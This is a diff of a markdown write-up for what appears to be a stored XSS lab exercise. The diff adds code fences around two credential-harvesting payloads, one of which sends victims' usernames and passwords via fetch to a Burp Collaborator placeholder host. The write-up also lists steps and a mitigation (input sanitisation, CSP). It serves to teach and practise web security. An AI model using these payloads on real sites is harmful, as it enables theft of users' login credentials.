@@ -40,11 +40,14 @@
 - **Tool Used:** Browser (Alternative method — no Burp Professional required)
 
 ### Official Payload (Requires Burp Collaborator — Burp Professional only)
-" <input name=username id=username>
+```html
+<input name=username id=username>
 <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
-method:'POST', mode: 'no-cors', body:username.value+':'+this.value });"> "
+method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
+```
 
 ### My Custom Crafted Payload (Without Burp Professional)
+```html
 <input type="text" name="username">
 <input type="password" name="password" onchange="hax()">
 <script>
@@ -66,6 +69,7 @@ function hax() {
     });
 }
 </script>
+```
 
 ### Steps
 1. Opened a blog post and identified comment section as injection point
@@ -81,7 +85,6 @@ function hax() {
 - **What happened:** Victim credentials captured and stored as blog comment
 - **Why it worked:** Comment input stored and reflected to all users without sanitization
 - **Mitigation:** Sanitize all user input, implement strict Content Security Policy (CSP)
-
 
  <img width="1896" height="1026" alt="lab2xss1" src="https://github.com/user-attachments/assets/3504fcf8-da82-4c22-b827-4341c6138639" />
 <img width="1129" height="434" alt="lab2xss2" src="https://github.com/user-attachments/assets/e3cf5261-4ae2-4eb0-8b40-0cea5ddde5af" />
